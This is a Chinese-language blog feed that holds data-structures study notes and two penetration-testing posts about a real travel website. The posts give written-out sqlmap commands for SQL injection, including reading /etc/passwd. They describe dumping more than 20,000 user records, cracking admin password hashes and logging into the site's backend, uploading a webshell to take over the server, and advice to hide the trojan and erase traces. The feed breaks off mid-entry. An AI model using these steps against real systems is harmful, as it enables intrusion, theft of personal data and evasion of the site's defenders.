class="string">"1-----邻接表建立无向图 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----邻接表表示图的深度优先搜索遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----邻接矩阵建立有向图 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----邻接矩阵表示图的深度优先搜索遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----迪杰斯特拉算法计算最短路径(先用邻接矩阵建立有向图)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="输出示例"><a href="#输出示例" class="headerlink" title="输出示例"></a>输出示例</h1><p>1.邻接表建立无向图<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175649148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>2.邻接表表示图的深度优先搜索遍历<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175714907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>3.邻接矩阵建立有向图<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020053117573588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>4.邻接矩阵的深度优先搜索遍历<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175756163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>5.迪杰斯特拉算法<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175821830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验性质：综合性实验&quot;&gt;&lt;a href=&quot;#实验性质：综合性实验&quot; class=&quot;headerlink&quot; title=&quot;实验性质：综合性实验&quot;&gt;&lt;/a&gt;实验性质：综合性实验&lt;/h1&gt;&lt;h1 id=&quot;要求：&quot;&gt;&lt;a href=&quot;#要求：&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据结构期末总结</title>
    <link href="http://zssblog.top/2020/05/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/"/>
    <id>http://zssblog.top/2020/05/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/</id>
    <published>2020-05-31T08:02:00.000Z</published>
    <updated>2020-05-31T10:06:17.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="各类型存储结构"><a href="#各类型存储结构" class="headerlink" title="各类型存储结构"></a>各类型存储结构</h1><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200531145418964.png"  alt="image-20200531145418964"></p><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529171311253.png"  alt="image-20200529171311253"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100<span class="comment">//顺序表可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType *elem;<span class="comment">//存储空间的基地址(例如用L.elem[0]取元素)</span></span><br><span class="line">    <span class="keyword">int</span> length;<span class="comment">//当前长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><p>L.elem[i]取值     //L.length-1=&gt;i&gt;=0，如元素为1,2,3，L.length=3，i=0,1,2</p><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529170625502.png"  alt="image-20200529170658268"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;<span class="comment">//结点的数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span><span class="comment">//结点的指针域，指向下一结点</span></span><br><span class="line">&#125;LNode,*LinkList;<span class="comment">//LinkList为指向结构体LNode的指针类型(相当于LNode *)</span></span><br></pre></td></tr></table></figure><p>若带头结点，空表条件为L-&gt;next==NULL（L为头指针指向头结点永不为空）</p><p>若不带头结点，空表条件为L==NULL</p><h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529170658268.png"  alt="image-20200529170625502"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;<span class="comment">//结点的数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">prior</span>;</span><span class="comment">//指向直接前驱</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">next</span>;</span><span class="comment">//指向直接后继</span></span><br><span class="line">&#125;DuLNode,*DuLinkList;</span><br></pre></td></tr></table></figure><h2 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529171934385.png"  alt="image-20200529172642776" style="zoom: 60%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100<span class="comment">//顺序栈存储空间的初始分配量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;<span class="comment">//栈底指针</span></span><br><span class="line">    SElemType *top;<span class="comment">//栈顶指针</span></span><br><span class="line">    <span class="keyword">int</span> stacksize;<span class="comment">//栈可用的最大容量</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure><p>栈空：S.top==S.base    //首尾指针相同</p><p>栈满：S.top-S.base==S.stacksize    //尾-首等于最大容量即为满</p><h2 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529171646363.png"  alt="image-20200529171934385" style="zoom: 50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义类似，类似操作受限的单链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span><span class="comment">//指向下一结点</span></span><br><span class="line">&#125;StackNode,*LinkStack;</span><br></pre></td></tr></table></figure><p>链栈一定是没有头结点，所以栈空的条件为：S==NULL</p><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529172331805.png"  alt="image-20200529171646363" style="zoom: 50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100 <span class="comment">//队列可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType *base;<span class="comment">//存储空间的基地址</span></span><br><span class="line">    <span class="keyword">int</span> front;<span class="comment">//头指针（只是有指针的作用,例如用Q.base[Q.front]取元素）</span></span><br><span class="line">    <span class="keyword">int</span> rear;<span class="comment">//尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p>队空：Q.front==Q.rear    //首尾指针相同</p><p>//尾指针指向的为最后一个元素的下一个地址(永远为空)，所以+1</p><p>队满：(Q.rear+1)%MAXSIZE==Q.front    </p><h2 id="链队"><a href="#链队" class="headerlink" title="链队"></a>链队</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529172642776.png"  alt="image-20200529172331805" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只看第一个定义和单链表类似，不同的是第二个设了队头和队尾指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> *<span class="title">next</span>;</span><span class="comment">//指向下一结点</span></span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QueuePtr front;<span class="comment">//队头指针(相等于QNode *front)</span></span><br><span class="line">    QueuePtr rear;<span class="comment">//队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure><p>队空：Q.front=Q.rear</p><p>由于串、数组、广义表的存储结构不是重点在这里就不再列出其存储结构</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>有==头尾指针==的有：==顺序栈和队列==(顺序和链式)</p><ul><li>顺序栈（栈顶和栈底）</li><li>循环队列</li><li>链队</li></ul><h1 id="1-绪论"><a href="#1-绪论" class="headerlink" title="1.绪论"></a>1.绪论</h1><p>1.逻辑结构：数据之间的相互关系。</p><ul><li>集合 结构中的数据元素除了同属于一种类型外，别无其它关系。</li><li>线性结构 数据元素之间一对一的关系</li><li>树形结构 数据元素之间一对多的关系</li><li>图状结构或网状结构 结构中的数据元素之间存在多对多的关系</li></ul><p>也可分为线性结构(可理解成一条直线能串起来)和非线性结构</p><p>2.存储结构分为顺序存储结构和链式存储结构</p><p>3.算法<strong>五个特性</strong>： 有穷性、确定性、可行性、输入、输出</p><p>4.算法设计要求：正确性、可读性、健壮性、高效性。(好的算法)</p><p>5.typedef可以理解成给现有数据类型起个别名</p><p>例如：typedef struct{…..}SqList，即给struct{……}起了个名字叫SqList</p><p>也用于类似于typedef int ElemType; 给int 起个别名叫ElemType即ElemType a;等价于int a;</p><p>这样做的好处是代码中用ElemType定义变量，如果想修改变量类型只需修改typedef ** ElemType即可，而不用一一修改。</p><blockquote><p>我们注意到有时候会有typedef struct LNode{…}LNode，即struct后有个LNode,这是因为如果结构体内部有指向结构体的指针则必须在struct后面加上LNode(单链表里有next指针struct LNode *next)</p></blockquote><p>6.时间复杂度：可以理解成就看执行了多少次</p><p>7.研究数据结构就是研究数据的逻辑结构、存储结构及其基本操作</p><p>8.抽象数据类型的三个组成部分为数据对象、数据关系、基本操作。</p><h1 id="2-线性表"><a href="#2-线性表" class="headerlink" title="2.线性表"></a>2.线性表</h1><p><strong>1.线性表和有序表合并的时间复杂度</strong></p><p>线性表的合并时间复杂度为O(m*n)</p><p>A=(7,5,3,11)，B=(2,6,3)，结果为A=(7,5,3,11,2,6)</p><p>算法需要循环遍历B(O(n))且LocateElem(A)(判断是否与B重复为O(m))所以为O(m*n)</p><p>有序表的合并时间复杂度为O(m+n)</p><p>A=(3,5,8,11)，B=(2,6,8)，结果为A=(2,3,5,6,8,11)</p><p>算法只需同时遍历A和B，然后将还没遍历完的那个直接插到最后就行，所以是相加</p><p>2.顺序表插入平均移动n+1/2，删除平均移动n-1/2</p><h1 id="4-串、数组和广义表"><a href="#4-串、数组和广义表" class="headerlink" title="4.串、数组和广义表"></a>4.串、数组和广义表</h1><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="求next数组和nextval数组"><a href="#求next数组和nextval数组" class="headerlink" title="求next数组和nextval数组"></a>求next数组和nextval数组</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200530144018875.png"  alt="image-20200530144018875"></p><p>当j=1(即第一个字符)时为特殊情况next和nextval均为0</p><h3 id="next数组：其值为当前字母前方的最大前后缀-1"><a href="#next数组：其值为当前字母前方的最大前后缀-1" class="headerlink" title="next数组：其值为当前字母前方的最大前后缀+1"></a>next数组：其值为当前字母前方的最大前后缀+1</h3><p>例如：j=3(A)，前面有A，B。没有前后缀即为0，0+1=1</p><p>j=4(B)，前面有ABA，有前缀和后缀A，即前后缀为1，1+1=2</p><p>j=5(A)，前面有ABAB，前后缀为AB，2+1=3    //ABA和BAB不等，所以AB为最大前后缀</p><h3 id="nextval数组：两种情况"><a href="#nextval数组：两种情况" class="headerlink" title="nextval数组：两种情况"></a>nextval数组：两种情况</h3><p>J对应的字母与next[j]的值转换为j对应的字母==不等==时，nextval值为next[j]</p><p>J对应的字母与next[j]的值转换为j对应的字母==相等==时，nextval值为nextval[next[j]]</p><blockquote><p>由此可看出要想求nextval，必须正确的求出next</p></blockquote><p>例如：j=2，j对应的字母为B，next[j]即next[2]=1，也就是j=1对应的字母为A，B与A不等则nextval值为next[2]=1</p><p>j=3，j对应的字母为A，next[j]即next[3]=1，也就是j=1对应的字母为A，A与A相等则nextval值为nextval[next[j]]=nextval[1]=0</p><h3 id="行优先和列优先"><a href="#行优先和列优先" class="headerlink" title="行优先和列优先"></a>行优先和列优先</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200530152310875.png"  alt="image-20200530152310875"></p><p>其实就是行优先就是先一行一行的存，列优先就是一列一列的存</p><p>无论是哪个其元素位置如a[2][3]位置不变，行优先就是先存上面2行再到它，列优先就是先存左面3列再存它</p><h2 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h2><p>广义表是线性表的推广(非线性)，也称列表（暂时理解成python里的列表）</p><p>广义表元素可为原子或子表</p><p>广义表长度：即元素个数(最外层括号里的小括号算一个元素)</p><p>广义表深度：就看有多少对括号就行(注意要将里面的子表全部展开)</p><p>表头(Head)和表尾(Tail)：当表非空时，第一个元素为表头其余均为表尾</p><blockquote><p>注意表头是第一个元素不带最外层的那个括号，表尾带最外层的括号</p></blockquote><p>例如A=((a,b),c)，表头为(a,b)而表尾为(c)</p><h2 id="串"><a href="#串" class="headerlink" title="串"></a>串</h2><p>串的子串个数为n(n+1)/2+1（空串也算所以加1）</p><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200530201544055.png"  alt="image-20200530201544055"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;各类型存储结构&quot;&gt;&lt;a href=&quot;#各类型存储结构&quot; class=&quot;headerlink&quot; title=&quot;各类型存储结构&quot;&gt;&lt;/a&gt;各类型存储结构&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/&quot; class=&quot;lazyload&quot; data-src=&quot;https://cd
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>某旅游网站子站存在上传漏洞已拿下服务器</title>
    <link href="http://zssblog.top/2020/05/25/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99%E5%AD%90%E7%AB%99%E5%AD%98%E5%9C%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%B7%B2%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://zssblog.top/2020/05/25/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99%E5%AD%90%E7%AB%99%E5%AD%98%E5%9C%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%B7%B2%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-05-25T07:36:00.000Z</published>
    <updated>2020-05-31T10:10:36.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上篇文章：<a href="http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E6%B3%84%E9%9C%B22%E4%B8%87%E5%A4%9A%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/">某旅游网站sql注入导致泄露2万多个人信息</a>已经找到了sql注入点拿到了数据库，但始终拿不到shell,经过探索，在一子站找到了上传点。</p><p>已成功上传拿到了服务器</p><p>但是！！！</p><p>由于没经验上传了木马到服务器没管第二天发现木马被删了，木马上传页面也被禁止访问了，补天因此没收录</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/%E4%B8%8B%E8%BD%BD.jpeg"  alt="下载"></p><p>咳咳，出于学习为主的原因，还是写了这篇文章(一个高危就这样溜了，哭泣.jpg)</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>子站 <a href="http://cs.xxxxxx.cn" target="_blank" rel="noopener">http://cs.xxxxxx.cn</a> 一客服管理系统可任意注册客服用户，聊天页面可上传shell，已拿下服务器。</p><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>在 <a href="http://cs.xxxxx.cn" target="_blank" rel="noopener">http://cs.xxxxx.cn</a> 页面源代码处发现注册页面，随便注册用户1成功注册，会给个专属聊天链接 <a href="http://cs.xxxxx.cn/index.php/Index/admin?kf=149806532" target="_blank" rel="noopener">http://cs.xxxxx.cn/index.php/Index/admin?kf=149806532</a></p><p>打开链接是一个聊天页面，没有上传文件选项，但是可以上传图片</p><p>聊天界面上传图片，抓包改为将image/jpeg改为php,base64编码一句话木马成功上传</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/f24238293cfc5895b4a6906fad7bc030d0e2f8804a8c5.png"  alt="img"></p><p>连接shell成功连接</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/1.png"  alt="4"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/4.png"  alt="1"></p><p>可任意下载修改文件，执行mysql命令</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>如果你恰巧看到了这篇文章，建议如果以后你上传了木马后测试可以的话就立马删除木马，清理所有痕迹(问的一群里大佬)。</p><p>清理了痕迹他们就不那么容易发现木马，而且补天审核还真的不是一般慢(两个星期)，他们收到你的漏洞后会再测下的，如果不能测试成功，那审核就不能通过，所以还是把木马藏好点保险。</p><p>还好有个任意用户登录漏洞被收录了，给了个中危。</p><p>清理痕迹，血的教训！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;上篇文章：&lt;a href=&quot;http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>某旅游网站sql注入导致泄露2万多个人信息</title>
    <link href="http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E6%B3%84%E9%9C%B22%E4%B8%87%E5%A4%9A%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/"/>
    <id>http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E6%B3%84%E9%9C%B22%E4%B8%87%E5%A4%9A%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/</id>
    <published>2020-05-22T14:34:00.000Z</published>
    <updated>2020-05-31T10:10:45.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>测试目标是一个旅游网站，发现了sql注入漏洞，泄露2万多用户信息，可任意下载服务器上文件。</p><p>所有可利用信息均打码处理。</p><h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>正常搜索没啥问题</p><p>但是当我们输入1’就会报错</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513141839168.png"  alt="image-20200513141920454"></p><p>尝试注释闭合，发现失败</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513141920454.png"  alt="image-20200513141839168"></p><p>尝试不注释闭合后面的</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142028584.png"  alt="image-20200513142028584"></p><p>后来多次尝试找到了问题所在</p><p>当我们把空格替换为/**/发现搜到了内容</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142322134.png"  alt="image-20200513142322134"></p><p>直接上sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;search&#x2F;cloudsearch?keyword&#x3D;1&amp;typeid&#x3D;0&quot; --level 3 -p keyword --tamper space2comment.py</span><br></pre></td></tr></table></figure><p>发现了好几个注入漏洞</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142514633.png"  alt="image-20200513144740433"></p><p>尝试列数据库，发现60多数据库</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/2.png"  alt="2"></p><p>查看当前数据库根据名字看到是一个cms</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142852619.png"  alt="image-20200513142852619"></p><p>谷歌搜下这个cms发现没啥爆出来的漏洞，看下cms数据库的结构</p><p>找到了会员表</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143035131.png"  alt="image-20200513142514633"></p><p>看下发现有2万多数据</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200512171651702.png"  alt="image-20200513144553013"></p><p>查看了下部分数据，可看到密码是MD5加密</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143239226.png"  alt="image-20200512171651702"></p><p>MD5破解后，成功登录</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143327053.png"  alt="image-20200513143035131"></p><h1 id="进一步利用漏洞"><a href="#进一步利用漏洞" class="headerlink" title="进一步利用漏洞"></a>进一步利用漏洞</h1><p>我们已经得到了了其用户账号和密码，我们想进一步利用</p><h2 id="登录子站后台"><a href="#登录子站后台" class="headerlink" title="登录子站后台"></a>登录子站后台</h2><p>查看cms表结构找到其admin表</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143537261.png"  alt="image-20200513143537261"></p><p>密码一看就是MD5尝试破解</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143623963.png"  alt="image-20200513143239226"></p><p>拿到了管理员密码，按理说我们应该尝试登录其后台，但是经扫描各种方法尝试也没找到它后台在哪，无奈放弃。</p><p>用subdomainsbrute 扫描子站，发现有个WordPress的博客</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144008090.png"  alt="image-20200513144008090"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144048053.png"  alt="image-20200513122737322"></p><p>首页后缀输入/login直接跳转到后台登录页面，用我们刚才得到的管理员数据直接登录成功</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513122737322.png"  alt="image-20200513144008090"></p><h2 id="服务器任意文件下载"><a href="#服务器任意文件下载" class="headerlink" title="服务器任意文件下载"></a>服务器任意文件下载</h2><p>以前打CTF不知道sqlmap还能下载文件，之前都是得到数据库看数据找flag</p><p>这也是但是网上搜如何进一步利用漏洞发现的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;xxxxx&#x2F;search&#x2F;cloudsearch?keyword&#x3D;1&amp;typeid&#x3D;0&quot; --level 3 -p keyword --tamper space2comment.py --file-read&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>去看下文件，成功下载</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144553013.png"  alt="image-20200513143623963"></p><p>另外我发现它首页如果访问一个不存在的控制器会报错，根据报错信息可以找到其根目录的绝对路径</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144740433.png"  alt="image-20200513144048053"></p><p>根据网站根目录可下载网站文件，这里就没再尝试了</p><h1 id="拿shell"><a href="#拿shell" class="headerlink" 